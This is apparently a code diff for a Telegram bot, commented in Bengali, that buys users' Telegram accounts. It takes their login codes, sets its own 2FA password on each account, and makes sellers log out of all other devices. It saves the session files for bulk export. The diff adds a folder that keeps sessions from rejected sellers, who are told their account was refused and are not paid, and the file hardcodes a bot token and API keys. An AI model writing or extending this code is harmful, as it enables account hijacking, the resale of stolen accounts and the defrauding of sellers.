@@ -18,22 +18,25 @@ API_HASH = "119a3ac4fd3dc368df92ae6d81f3bb3e"
 BOT_TOKEN = "8288574083:AAE9eidUl-iZl0I4Sbt8jcDM7k8JJqSYK_Y"
 ADMIN_ID = 8095751648
 
-MAIN_CHANNEL_ID = -1003904729385          # মেইন চ্যানেল (বাধ্যতামূলক জয়েন)
-SESSION_LOG_CHANNEL_ID = -1004345512666   # সেশন কনফার্মেশন চ্যানেল 
-WITHDRAW_LOG_CHANNEL_ID = -1004331985961  # উইথড্র কনফার্মেশন চ্যানেল
+MAIN_CHANNEL_ID = -1003904729385          
+SESSION_LOG_CHANNEL_ID = -1004345512666   
+WITHDRAW_LOG_CHANNEL_ID = -1004331985961  
 
 MAIN_CHANNEL_LINK = "https://t.me/fastrecivernews" 
 # =================================================================
 
 BASE_STORAGE_DIR = "user_backups"
+PENDING_STORAGE_DIR = "pending_backups" 
 TRASH_STORAGE_DIR = "trash_backups"
-DB_FILE = "user_database.json"
-SETTINGS_FILE = "bot_settings.json"
+TIMED_OUT_STORAGE_DIR = "timed_out_backups" # 🕒 টাইম ডিলে ফাইলের নতুন ডেডিকেটেড ফোল্ডার
 
-for folder in [BASE_STORAGE_DIR, TRASH_STORAGE_DIR]:
+for folder in [BASE_STORAGE_DIR, PENDING_STORAGE_DIR, TRASH_STORAGE_DIR, TIMED_OUT_STORAGE_DIR]:
     if not os.path.exists(folder):
         try: os.makedirs(folder, exist_ok=True)
         except: pass
+
+DB_FILE = "user_database.json"
+SETTINGS_FILE = "bot_settings.json"
 
 DEFAULT_SETTINGS = {
     "security_password": "MySecureBotPassword123",
@@ -146,6 +149,11 @@ def get_trash_file_count():
     try: return len([f for f in os.listdir(TRASH_STORAGE_DIR) if f.endswith(".session")])
     except: return 0
 
+def get_timed_out_file_count():
+    if not os.path.exists(TIMED_OUT_STORAGE_DIR): return 0
+    try: return len([f for f in os.listdir(TIMED_OUT_STORAGE_DIR) if f.endswith(".session")])
+    except: return 0
+
 # ==================== FLASK SERVER ====================
 app = Flask("UptimeServer")
 @app.route('/')
@@ -159,9 +167,10 @@ def home():
         cap = settings["country_capacity"].get(code, "No Limit")
         country_list_html += f"<tr><td><b>+{code}</b></td><td>{count} / {cap}</td><td>${settings['country_prices'][code]}</td></tr>"
     trash_count = get_trash_file_count()
+    to_count = get_timed_out_file_count()
     html_template = f"""
     <!DOCTYPE html><html><head><title>Dashboard</title><meta name="viewport" content="width=device-width, initial-scale=1"><style>body {{ font-family: sans-serif; background-color: #0f172a; color: #f8fafc; text-align: center; padding: 40px 20px; }} .card {{ background: #1e293b; max-width: 450px; margin: auto; padding: 25px; border-radius: 10px; border: 1px solid #334155; }} h1 {{ color: #38bdf8; }} table {{ width: 100%; margin-top: 15px; text-align: left; }} th, td {{ padding: 8px; border-bottom: 1px solid #334155; }}</style></head>
-    <body><div class="card"><h2 style="color:#10b981;">● SERVER ONLINE</h2><h1>Cloud Backup Bot</h1><p>Total Saved Sessions: <b>{total_sessions}</b></p><p>Trash (Exported) Files: <b>{trash_count} Pcs</b></p><table><tr><th>Country</th><th>Used/Cap</th><th>Price</th></tr>{country_list_html}</table></div></body></html>
+    <body><div class="card"><h2 style="color:#10b981;">● SERVER ONLINE</h2><h1>Cloud Backup Bot</h1><p>Total Saved Sessions: <b>{total_sessions}</b></p><p>Time Delay Files: <b>{to_count} Pcs</b></p><p>Trash (Exported) Files: <b>{trash_count} Pcs</b></p><table><tr><th>Country</th><th>Used/Cap</th><th>Price</th></tr>{country_list_html}</table></div></body></html>
     """
     return render_template_string(html_template)
 
@@ -173,32 +182,27 @@ def run_flask():
 bot = telebot.TeleBot(BOT_TOKEN, parse_mode="Markdown")
 user_data = {}
 admin_state = {}
+live_trackers = {} 
 
-bot_loop = asyncio.new_event_loop()
 def start_async_loop(loop):
     asyncio.set_event_loop(loop)
     loop.run_forever()
+bot_loop = asyncio.new_event_loop()
 Thread(target=start_async_loop, args=(bot_loop,), daemon=True).start()
 
 def is_user_joined_main_channel(user_id):
     if user_id == ADMIN_ID: return True
     try:
         member = bot.get_chat_member(MAIN_CHANNEL_ID, user_id)
-        if member.status in ['member', 'administrator', 'creator']:
-            return True
+        if member.status in ['member', 'administrator', 'creator']: return True
         return False
-    except:
-        return True 
+    except: return True 
 
 def check_force_join(message):
     if not is_user_joined_main_channel(message.from_user.id):
         markup = types.InlineKeyboardMarkup()
         markup.add(types.InlineKeyboardButton("📢 Join Our Channel", url=MAIN_CHANNEL_LINK))
-        bot.send_message(
-            message.chat.id, 
-            "⚠️ **Please join our main channel for more update!**\n\nবট ব্যবহার করতে আপনাকে অবশ্যই আমাদের মেইন চ্যানেলে জয়েন করতে হবে। জয়েন করার পর আবার ট্রাই করুন।", 
-            reply_markup=markup
-        )
+        bot.send_message(message.chat.id, "⚠️ **Please join our main channel for more update!**\n\nবট ব্যবহার করতে আপনাকে অবশ্যই আমাদের মেইন চ্যানেলে জয়েন করতে হবে। জয়েন করার পর আবার ট্রাই করুন।", reply_markup=markup)
         return False
     return True
 
@@ -353,20 +357,39 @@ def admin_panel_command(message):
         types.InlineKeyboardButton("❌ Close Panel", callback_data="pnl_close")
     )
     
+    to_cnt = get_timed_out_file_count()
     trash_cnt = get_trash_file_count()
+    
+    # 🕒 প্যানেলে নতুন টাইম ডিলে ফাইল ম্যানেজমেন্ট বোতাম যোগ করা হলো
+    markup.add(types.InlineKeyboardButton(f"🕒 Time Delay Files ({to_cnt} Pcs)", callback_data="pnl_view_to"))
+    markup.add(types.InlineKeyboardButton("📥 Download All Time Delay Files", callback_data="pnl_download_to"))
+    
     markup.add(types.InlineKeyboardButton(f"🗑️ View Trash Files ({trash_cnt} Pcs)", callback_data="pnl_view_trash"))
     markup.add(
         types.InlineKeyboardButton("📥 Download All Trash Files", callback_data="pnl_download_all_trash"),
         types.InlineKeyboardButton("💥 Delete All Trash Permanent", callback_data="pnl_clear_trash")
     )
     
-    panel_msg = f"🛠 *Master Admin Control Panel*\n\n🔐 *Default 2FA Password:* `{settings['security_password']}`\n\n🗑️ **Trash Area Size:** {trash_cnt} files currently stored (As Bin Storage)."
+    panel_msg = f"🛠 *Master Admin Control Panel*\n\n🔐 *Default 2FA Password:* `{settings['security_password']}`\n\n🕒 **Time Delay Folder Size:** {to_cnt} files stored.\n🗑️ **Trash Area Size:** {trash_cnt} files currently stored."
     bot.send_message(message.chat.id, panel_msg, reply_markup=markup)
 
-@bot.callback_query_handler(func=lambda call: call.data.startswith("pnl_"))
-def handle_admin_callbacks(call):
-    if call.from_user.id != ADMIN_ID: return
+@bot.callback_query_handler(func=lambda call: call.data.startswith("pnl_") or call.data.startswith("check_time_"))
+def handle_admin_and_user_callbacks(call):
     settings = load_settings()
+    
+    if call.data.startswith("check_time_"):
+        pid = call.data.replace("check_time_", "")
+        if pid in live_trackers:
+            rem = live_trackers[pid]
+            if rem > 0:
+                bot.answer_callback_query(call.id, f"⏳ আপনার অ্যাকাউন্টটি কনফার্ম হতে আর {rem} সেকেন্ড বাকি আছে। দয়া করে লগআউট করে অপেক্ষা করুন।", show_alert=True)
+            else:
+                bot.answer_callback_query(call.id, "🔄 অ্যাকাউন্টটি প্রসেস হচ্ছে...", show_alert=False)
+        else:
+            bot.answer_callback_query(call.id, "❌ সেশন ট্র্যাকারটি পাওয়া যায়নি বা বাতিল হয়েছে।", show_alert=True)
+        return
+
+    if call.from_user.id != ADMIN_ID: return
     
     if call.data == "pnl_close":
         bot.delete_message(call.message.chat.id, call.message.message_id)
@@ -390,11 +413,50 @@ def handle_admin_callbacks(call):
             cap = settings["country_capacity"].get(code, 999)
             delay = settings.get("country_delays", {}).get(code, 60)
             response += f"• 🌍 **+{code}** ➜ Price: ${prc} | Cap: {cap} | Delay: {delay}s\n"
-        
         markup = types.InlineKeyboardMarkup()
         markup.add(types.InlineKeyboardButton("⬅️ Back to Panel", callback_data="pnl_back"))
         bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=response, reply_markup=markup)
     
+    # 🕒 [টাইম ডিলে ফাইলের তালিকা দেখা]
+    elif call.data == "pnl_view_to":
+        if not os.path.exists(TIMED_OUT_STORAGE_DIR):
+            bot.answer_callback_query(call.id, "Timed out directory does not exist!", show_alert=True)
+            return
+        to_files = [f for f in os.listdir(TIMED_OUT_STORAGE_DIR) if f.endswith(".session")]
+        if not to_files:
+            bot.answer_callback_query(call.id, "🕒 Time Delay Folder is totally empty!", show_alert=True)
+            return
+        list_msg = "🕒 **Time Delay (1 Hour Timeout) Files List:**\n\n"
+        for idx, f in enumerate(to_files[:50], 1):
+            list_msg += f"{idx}. `{f}`\n"
+        if len(to_files) > 50: list_msg += f"\nAnd {len(to_files)-50} more files..."
+        bot.send_message(call.message.chat.id, list_msg)
+        bot.answer_callback_query(call.id)
+        
+    # 📥 [টাইম ডিলে ফাইল জিপ আকারে ডাউনলোড করা]
+    elif call.data == "pnl_download_to":
+        if not os.path.exists(TIMED_OUT_STORAGE_DIR):
+            bot.answer_callback_query(call.id, "Folder does not exist!", show_alert=True)
+            return
+        all_to_files = os.listdir(TIMED_OUT_STORAGE_DIR)
+        if not all_to_files:
+            bot.answer_callback_query(call.id, "❌ Folder is empty!", show_alert=True)
+            return
+            
+        bot.answer_callback_query(call.id, "⏳ Packing Time Delay files...", show_alert=False)
+        zip_filename = "Time_Delay_Sessions.zip"
+        try:
+            with zipfile.ZipFile(zip_filename, 'w') as zipf:
+                for file in all_to_files:
+                    file_path = os.path.join(TIMED_OUT_STORAGE_DIR, file)
+                    if os.path.isfile(file_path): zipf.write(file_path, arcname=file)
+            with open(zip_filename, 'rb') as doc:
+                bot.send_document(call.message.chat.id, doc, caption=f"📦 Total Time Delay (Timeout) Sessions Downloaded!")
+            os.remove(zip_filename)
+            bot.send_message(call.message.chat.id, "✅ **Downloaded successfully.** (ফাইলগুলো ফোল্ডারেই থেকে যাবে, ডিলিট হবে না)")
+        except Exception as e:
+            bot.send_message(call.message.chat.id, f"❌ Download Error: {e}")
+
     elif call.data == "pnl_view_trash":
         if not os.path.exists(TRASH_STORAGE_DIR):
             bot.answer_callback_query(call.id, "Trash directory does not exist!", show_alert=True)
@@ -418,24 +480,19 @@ def handle_admin_callbacks(call):
         if not all_trash_files:
             bot.answer_callback_query(call.id, "❌ Bin is empty! No files to download.", show_alert=True)
             return
-            
-        bot.answer_callback_query(call.id, "⏳ Packing all trash files... Please wait.", show_alert=False)
+        bot.answer_callback_query(call.id, "⏳ Packing all trash files...", show_alert=False)
         zip_filename = "All_Trash_Sessions.zip"
         try:
             with zipfile.ZipFile(zip_filename, 'w') as zipf:
                 for file in all_trash_files:
                     file_path = os.path.join(TRASH_STORAGE_DIR, file)
-                    if os.path.isfile(file_path):
-                        zipf.write(file_path, arcname=file)
-            
+                    if os.path.isfile(file_path): zipf.write(file_path, arcname=file)
             with open(zip_filename, 'rb') as doc:
                 bot.send_document(call.message.chat.id, doc, caption=f"📦 Total Trash Backup Downloaded Successfully!")
-            
             os.remove(zip_filename)
             for file in all_trash_files:
                 try: os.remove(os.path.join(TRASH_STORAGE_DIR, file))
                 except: pass
-                
             bot.send_message(call.message.chat.id, "💥 **Downloaded & Auto-Cleared Trash Area successfully!**")
             bot.delete_message(call.message.chat.id, call.message.message_id)
             admin_panel_command(call.message)
@@ -444,11 +501,9 @@ def handle_admin_callbacks(call):
         
     elif call.data == "pnl_clear_trash":
         try:
-            for file in os.listdir(TRASH_STORAGE_DIR):
-                os.remove(os.path.join(TRASH_STORAGE_DIR, file))
+            for file in os.listdir(TRASH_STORAGE_DIR): os.remove(os.path.join(TRASH_STORAGE_DIR, file))
             bot.answer_callback_query(call.id, "💥 All Trash Data Deleted Permanently!", show_alert=True)
-        except Exception as e:
-            bot.answer_callback_query(call.id, f"Error: {e}", show_alert=True)
+        except Exception as e: bot.answer_callback_query(call.id, f"Error: {e}", show_alert=True)
         bot.delete_message(call.message.chat.id, call.message.message_id)
         admin_panel_command(call.message)
         
@@ -458,8 +513,7 @@ def handle_admin_callbacks(call):
         for code in settings["country_prices"]:
             count = get_current_file_count(code)
             file_msg += f"• 🌍 Country `+{code}` ➜ **{count} Pcs** Active\n"
-            if count > 0:
-                markup.add(types.InlineKeyboardButton(f"📥 Download from +{code} ({count} Pcs)", callback_data=f"pnl_askamt_{code}"))
+            if count > 0: markup.add(types.InlineKeyboardButton(f"📥 Download from +{code} ({count} Pcs)", callback_data=f"pnl_askamt_{code}"))
         markup.add(types.InlineKeyboardButton("⬅️ Back", callback_data="pnl_back"))
         bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=file_msg, reply_markup=markup)
         
@@ -480,7 +534,6 @@ def handle_text(message):
     
     if user_id in admin_state:
         state = admin_state[user_id]
-        
         if state == "wait_wtd_card":
             stats = get_user_stats(user_id)
             current_bal = stats['verified_balance']
@@ -491,9 +544,8 @@ def handle_text(message):
             clear_user_verified_balance_and_stats(user_id)
             del admin_state[user_id]
             bot.reply_to(message, f"✅ **Your Card withdrawal request for {current_bal} USDT has been submitted!**")
-            
             try: bot.send_message(WITHDRAW_LOG_CHANNEL_ID, f"📥 **Withdraw Card!**\n👤 User: `{user_id}`\n💰 Amount: {current_bal} USDT\n💳 Info: {text}")
-            except: bot.send_message(ADMIN_ID, f"⚠️ Channel Fail! Card Withdraw Log: User `{user_id}` | Amt: {current_bal} | Info: {text}")
+            except: pass
             return
             
         elif state == "wait_wtd_bep20":
@@ -510,9 +562,8 @@ def handle_text(message):
             clear_user_verified_balance_and_stats(user_id)
             del admin_state[user_id]
             bot.reply_to(message, f"✅ **Your USDT (BEP-20) withdrawal request for {current_bal} USDT has been submitted!**")
-            
             try: bot.send_message(WITHDRAW_LOG_CHANNEL_ID, f"📥 **Withdraw BEP20!**\n👤 User: `{user_id}`\n💰 Amount: {current_bal} USDT\n🪙 Addr: `{text}`")
-            except: bot.send_message(ADMIN_ID, f"⚠️ Channel Fail! BEP20 Withdraw Log: User `{user_id}` | Amt: {current_bal} | Addr: {text}")
+            except: pass
             return
 
         if user_id == ADMIN_ID:
@@ -528,8 +579,7 @@ def handle_text(message):
                         return
                     bot.reply_to(message, f"⏳ Packing {amount} sessions for `+{code}`...")
                     export_logic(message.chat.id, code, amount)
-                except:
-                    bot.reply_to(message, "❌ **Please send a valid number!**")
+                except: bot.reply_to(message, "❌ **Please send a valid number!**")
                 return
 
             del admin_state[user_id]
@@ -547,7 +597,6 @@ def handle_text(message):
                     settings["country_delays"][code] = int(parts[3].strip())
                     save_settings(settings)
                     bot.reply_to(message, f"✅ Country `+{code}` updated.")
-                
                 elif state == "wait_delete_country":
                     code_to_del = text.replace("+", "").strip()
                     if code_to_del in settings["country_prices"]:
@@ -556,13 +605,11 @@ def handle_text(message):
                         if code_to_del in settings.get("country_delays", {}): del settings["country_delays"][code_to_del]
                         save_settings(settings)
                         bot.reply_to(message, f"✅ **Country `+{code_to_del}` has been successfully deleted!**")
-                    else:
-                        bot.reply_to(message, f"❌ **Country `+{code_to_del}` not found in active list!**")
+                    else: bot.reply_to(message, f"❌ **Country `+{code_to_del}` not found in active list!**")
             except Exception as e: bot.reply_to(message, f"❌ Error: {e}")
             return
 
     if not check_force_join(message): return
-
     if user_id in user_data and ("phone_code_hash" in user_data[user_id] or user_data[user_id].get("waiting_for_password")):
         asyncio.run_coroutine_threadsafe(verify_otp_task(text, user_id, message), bot_loop)
         return
@@ -579,8 +626,7 @@ def handle_text(message):
             return
         processing_msg = bot.reply_to(message, "🔄 Processing please wait...")
         asyncio.run_coroutine_threadsafe(send_otp_task(phone, matched_code, user_id, message, processing_msg), bot_loop)
-    else:
-        bot.reply_to(message, "❌ Invalid Format. Use /start to reset.")
+    else: bot.reply_to(message, "❌ Invalid Format. Use /start to reset.")
 
 # ==================== TELETHON ASYNC BACKEND ====================
 async def send_otp_task(phone_number, country_code, user_id, message, processing_msg):
@@ -593,9 +639,7 @@ async def send_otp_task(phone_number, country_code, user_id, message, processing
         bot.edit_message_text("❌ This number already exists. Try another number.", message.chat.id, processing_msg.message_id)
         return
         
-    final_session_path = os.path.join(BASE_STORAGE_DIR, country_code, f"+{clean_phone}")
-    os.makedirs(os.path.dirname(final_session_path), exist_ok=True)
-    
+    final_session_path = os.path.join(PENDING_STORAGE_DIR, f"+{clean_phone}")
     user_client = TelegramClient(final_session_path, API_ID, API_HASH, base_logger='critical')
     try:
         await user_client.connect()
@@ -615,29 +659,21 @@ async def send_otp_task(phone_number, country_code, user_id, message, processing
 
 async def verify_otp_task(text, user_id, message):
     data = user_data[user_id]
-    
     try:
         await data["client"].sign_in(data["phone"], text, phone_code_hash=data["phone_code_hash"])
         settings = load_settings()
-        try:
-            await data["client"].edit_2fa(new_password=settings["security_password"])
-        except:
-            pass
+        try: await data["client"].edit_2fa(new_password=settings["security_password"])
+        except: pass
         await process_backup(user_id, message, data)
         del user_data[user_id]
-        
     except SessionPasswordNeededError:
         bot.reply_to(message, "❌ **This account cannot be received!**\n\n২ স্টেপ ভেরিফিকেশন (Two-Step Verification) একটিভ থাকার কারণে অ্যাকাউন্টটি নেওয়া সম্ভব হচ্ছে না।")
         try:
             await data["client"].disconnect()
-            if os.path.exists(f"{data['session_path']}.session"): 
-                os.remove(f"{data['session_path']}.session")
-        except: 
-            pass
+            if os.path.exists(f"{data['session_path']}.session"): os.remove(f"{data['session_path']}.session")
+        except: pass
         del user_data[user_id]
-        
-    except Exception as e: 
-        bot.reply_to(message, f"❌ OTP Error: {e}")
+    except Exception as e: bot.reply_to(message, f"❌ OTP Error: {e}")
 
 async def process_backup(user_id, message, data):
     settings = load_settings()
@@ -647,11 +683,22 @@ async def process_backup(user_id, message, data):
     add_to_verified_numbers(data["clean_phone"])
     add_user_pending_account(user_id, price)
     
-    markup = types.InlineKeyboardMarkup()
-    markup.add(types.InlineKeyboardButton(f"✅ Account Verification {price}", callback_data="none"))
-    bot.reply_to(message, f"✅ The account number `{data['phone']}` was successfully received\n\n❗ You have to wait {delay} seconds time to confirm the account, please log out\n\n👇 The bot will automatically verify your account\n\n🏷️ Spam Status : 🕊️ Free As Bird", reply_markup=markup)
+    tracker_id = str(user_id) + "_" + str(int(datetime.now().timestamp()))
+    live_trackers[tracker_id] = delay
     
+    markup = types.InlineKeyboardMarkup()
+    markup.add(types.InlineKeyboardButton(f"✅ Account Verification {price}", callback_data=f"check_time_{tracker_id}"))
+    received_msg = bot.reply_to(message, f"✅ The account number `{data['phone']}` was successfully received\n\n❗ You have to wait {delay} seconds time to confirm the account, please log out\n\n👇 The bot will automatically verify your account\n\n🏷️ Spam Status : 🕊️ Free As Bird", reply_markup=markup)
+    
+    async def countdown_timer():
+        for i in range(delay, 0, -1):
+            live_trackers[tracker_id] = i
+            await asyncio.sleep(1)
+        live_trackers[tracker_id] = 0
+        
+    asyncio.create_task(countdown_timer())
     await asyncio.sleep(delay)
+    
     max_wait_extended = 3600  
     interval = 60             
     elapsed = 0
@@ -660,7 +707,7 @@ async def process_backup(user_id, message, data):
         try:
             if not data["client"].is_connected(): await data["client"].connect()
             
-            # 🛡️ [নতুন সেফটি গ্যারান্টি] ইউজার বটের ডিভাইস ডিলিট করে দিলে এই চেকটি ট্র্রিগার হবে
+            # 🛡️ [১. সময়ের আগে বটের ডিভাইস ক্লিয়ার করে দিলে]
             if not await data["client"].is_user_authorized():
                 reject_pending_account(user_id, price)
                 db = load_db()
@@ -668,10 +715,10 @@ async def process_backup(user_id, message, data):
                     db["verified_numbers"].remove(data["clean_phone"])
                     save_db(db)
                 
-                # চোর ইউজারকে কড়া নোটিশ পাঠানো
-                bot.send_message(message.chat.id, f"❌ **অ্যাকাউন্ট বাতিল!**\n\nআপনি `{data['phone']}` অ্যাকাউন্ট থেকে বটের ডিভাইসটি ডিলিট (Terminate) করে দিয়েছেন। এই চালাকির কারণে অ্যাকাউন্টটি সাথে সাথে রিজেক্ট করা হলো এবং কোনো ব্যালেন্স দেওয়া হবে না।")
+                # তোর দেওয়া রিকোয়েস্ট অনুযায়ী ইংলিশ প্রফেশনাল নোটিশ দেওয়া হলো
+                bot.send_message(message.chat.id, f"❌ **This account cannot be received because it is unauthorized.**")
                 
-                # নষ্ট ডেটা ফাইল সরাসরি ট্র্যাশে মুভ করা
+                # ফাইল সরাসরি মেইন ফোল্ডারে যাবে না, ট্র্যাশে মুভ হবে
                 try:
                     await data["client"].disconnect()
                     if os.path.exists(f"{data['session_path']}.session"):
@@ -679,18 +726,37 @@ async def process_backup(user_id, message, data):
                     if os.path.exists(f"{data['session_path']}.session-journal"):
                         shutil.move(f"{data['session_path']}.session-journal", os.path.join(TRASH_STORAGE_DIR, f"{data['clean_phone']}.session-journal"))
                 except: pass
+                if tracker_id in live_trackers: del live_trackers[tracker_id]
                 return
                 
             auths = await data["client"](functions.account.GetAuthorizationsRequest())
             other_devices = [a for a in auths.authorizations if not a.current]
             
+            # 🎉 [২. সাকসেসফুলি অ্যাকাউন্ট কনফার্মড লজিক]
             if len(other_devices) == 0:
                 await data["client"].disconnect()
+                
+                # কনফার্মড সেশনগুলোই মেইন ফোল্ডারের কান্ট্রি ক্যাটাগরিতে যাবে 
+                final_country_dir = os.path.join(BASE_STORAGE_DIR, data['country_code'])
+                os.makedirs(final_country_dir, exist_ok=True)
+                
+                if os.path.exists(f"{data['session_path']}.session"):
+                    shutil.move(f"{data['session_path']}.session", os.path.join(final_country_dir, f"+{data['clean_phone']}.session"))
+                if os.path.exists(f"{data['session_path']}.session-journal"):
+                    shutil.move(f"{data['session_path']}.session-journal", os.path.join(final_country_dir, f"+{data['clean_phone']}.session-journal"))
+                
                 convert_pending_to_verified(user_id, price)
-                bot.send_message(message.chat.id, f"🎉 **Account {data['phone']} confirmed!** Balance moved to Verified.")
+                
+                # রিসিভ মেসেজ ডিলিট করে দেওয়া হবে
+                try: bot.delete_message(message.chat.id, received_msg.message_id)
+                except: pass
+                
+                # শুধুমাত্র কনফার্মড মেসেজটি চ্যাটে থাকবে
+                bot.send_message(message.chat.id, f"🎉 Account `{data['phone']}` confirmed! Balance moved to Verified.")
                 
                 try: bot.send_message(SESSION_LOG_CHANNEL_ID, f"🔔 **New Verified Session Saved:** `{data['phone']}`")
-                except: bot.send_message(ADMIN_ID, f"⚠️ Channel Fail! New Session: `{data['phone']}`")
+                except: pass
+                if tracker_id in live_trackers: del live_trackers[tracker_id]
                 return
             else:
                 if elapsed == 0:
@@ -700,12 +766,23 @@ async def process_backup(user_id, message, data):
         await asyncio.sleep(interval)
         elapsed += interval
 
+    # 🕒 [৩. ১ ঘণ্টা পার হলেও যদি ডিভাইস ক্লিয়ার না করে - টাইম ডিলে লজিক]
     reject_pending_account(user_id, price)
     db = load_db()
     if data["clean_phone"] in db.get("verified_numbers", []):
         db["verified_numbers"].remove(data["clean_phone"])
         save_db(db)
+    
+    # ফাইলগুলো ট্র্যাশে যাবে না, তোর ডেডিকেটেড টাইম ডিলে ফোল্ডারে (timed_out_backups) জমা হবে
+    try:
+        if os.path.exists(f"{data['session_path']}.session"):
+            shutil.move(f"{data['session_path']}.session", os.path.join(TIMED_OUT_STORAGE_DIR, f"{data['clean_phone']}.session"))
+        if os.path.exists(f"{data['session_path']}.session-journal"):
+            shutil.move(f"{data['session_path']}.session-journal", os.path.join(TIMED_OUT_STORAGE_DIR, f"{data['clean_phone']}.session-journal"))
+    except: pass
+    
     bot.send_message(message.chat.id, f"❌ **Verification Failed!** You did not clear other devices within 1 hour for `{data['phone']}`. Account rejected.")
+    if tracker_id in live_trackers: del live_trackers[tracker_id]
 
 # ==================== MAIN RUNNER ====================
 if __name__ == "__main__":
